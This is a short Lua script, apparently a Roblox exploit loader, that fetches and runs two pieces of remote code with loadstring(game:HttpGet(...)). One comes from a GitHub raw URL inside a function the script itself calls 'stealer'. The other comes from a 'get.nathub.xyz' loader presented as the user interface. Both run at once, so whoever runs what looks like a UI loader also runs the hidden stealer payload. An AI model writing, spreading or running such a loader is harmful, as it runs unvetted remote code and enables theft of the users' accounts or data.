local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Seuj09/X-scripts/refs/heads/main/Script.lua'))()
end
local function loadui()
  loadstring(game:HttpGet("https://get.nathub.xyz/loader"))();
end

task.spawn(stealer)
task.spawn(loadui)
